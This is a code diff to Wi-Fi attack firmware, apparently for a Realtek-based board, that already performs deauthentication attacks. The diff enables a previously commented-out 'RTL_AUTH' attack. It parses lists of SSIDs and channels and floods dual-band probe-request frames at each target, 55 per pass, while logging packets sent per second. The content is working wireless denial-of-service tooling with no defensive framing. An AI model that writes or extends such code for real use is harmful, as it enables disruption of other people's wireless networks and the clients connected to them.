@@ -9,6 +9,7 @@
 
 LinkedList<BssidToDeauth>* bssid_to_deauth_list;
 LinkedList<BssidToDeauthWithStaion>* bssid_to_deauth_with_station_list;
+LinkedList<StringToProbeReq>* ssid_to_probe_req_list;
 
 WiFiCallback wifiscan;
 
@@ -20,6 +21,7 @@ void setup() {
     pinMode(LED_B, OUTPUT);
     bssid_to_deauth_list = new LinkedList<BssidToDeauth>();
     bssid_to_deauth_with_station_list = new LinkedList<BssidToDeauthWithStaion>();
+    ssid_to_probe_req_list = new LinkedList<StringToProbeReq>();
 }
 
 bool ap_scan = false;
@@ -42,6 +44,7 @@ void loop() {
         else if (command == "RTL_STOP_SCAN") {
             bssid_to_deauth_list->clear();
             bssid_to_deauth_with_station_list->clear();
+            ssid_to_probe_req_list->clear();
 
             ap_scan = false;
 
@@ -96,8 +99,8 @@ void loop() {
             std::vector<String> src_macs;
             std::vector<String> channels;
             
-            int src_count = splitStringToVector(src_macs_str, ',', src_macs);
-            int ch_count = splitStringToVector(channels_str, ',', channels);
+            int src_count = splitStringToVector(src_macs_str, ",", src_macs);
+            int ch_count = splitStringToVector(channels_str, ",", channels);
 
             // Clear existing list
             if (bssid_to_deauth_with_station_list != nullptr) {
@@ -140,7 +143,7 @@ void loop() {
                 // Parse stations trong group này
                 if (group_str.length() > 0) {
                     std::vector<String> sta_macs;
-                    int sta_count = splitStringToVector(group_str, ',', sta_macs);
+                    int sta_count = splitStringToVector(group_str, ",", sta_macs);
                     
                     
                     for (int i = 0; i < sta_count; i++) {
@@ -195,8 +198,8 @@ void loop() {
                 std::vector<String> channels;
                 
                 // Split and process
-                int src_count = splitStringToVector(src_macs_str, ',', src_macs);
-                int ch_count = splitStringToVector(channels_str, ',', channels);
+                int src_count = splitStringToVector(src_macs_str, ",", src_macs);
+                int ch_count = splitStringToVector(channels_str, ",", channels);
                 
                 for (int i = 0; i < src_count && i < ch_count; i++) {
                     uint8_t src_mac[6];
@@ -214,23 +217,31 @@ void loop() {
                 deauthentication_attack = true;
             }
         }
-        /*
-        else if (command.startsWith("RTL_START_AUTH_ATTACK")) {
-            // RTL_START_AUTH_ATTACK -s <SSID> -c <CHANNEL>
+        else if (command.startsWith("RTL_AUTH")) {
+            // RTL_AUTH -s {<SSID>} -c {<CHANNEL>}
             int s_arg_index = command.indexOf("-s ");
             int c_arg_index = command.indexOf("-c ");
 
             if (s_arg_index > 0 && c_arg_index > 0) {
-                ssid_to_probe_req = command.substring(s_arg_index + 3, c_arg_index - 1);
-                String channel_str = command.substring(c_arg_index + 3);
+                std::vector<String> ssids;
+                std::vector<String> channels;
 
-                channel = channel_str.toInt();
+                // Parse ssids, channel
+                int ssidcount = splitStringToVector(command.substring(command.indexOf("{", s_arg_index) + 1, command.indexOf("}", s_arg_index)), "(,)", ssids);
+                int channelcount = splitStringToVector(command.substring(command.indexOf("{", c_arg_index) + 1, command.indexOf("}", c_arg_index)), ",", channels);
+
+                for (int i = 0; i < ssidcount && i < channelcount; i++) {
+                    StringToProbeReq stpr;
+                    stpr.ssid = ssids[i];
+                    stpr.channel = channels[i].toInt();
+                    ssid_to_probe_req_list->add(stpr);
 
                 digitalWrite(LED_R, HIGH);
+                wifi_on(RTW_MODE_AP);
                 auth_attack = true;
+                }
             }
         }
-        */
     }
 
     if (ap_scan) {
@@ -275,7 +286,17 @@ void loop() {
         }
     }
     else if (auth_attack) {
-        //sendDualBandProbeReqFrame(ssid_to_probe_req, channel);
-        //delay(1);
+        for (int i = 0; i < ssid_to_probe_req_list->size(); i++) {
+            for (int k = 0; k < 55; k++) {
+                sendDualBandProbeReqFrame(ssid_to_probe_req_list->get(i).ssid, ssid_to_probe_req_list->get(i).channel);
+                packet_sent = packet_sent + 6;
+            }
+        }
+        static unsigned long initTime = millis();
+        if (millis() - initTime > 1000) {
+            initTime = millis();
+            Serial.println("PACKET:" + String(packet_sent));
+            packet_sent = 0;
+        }
     }
 }
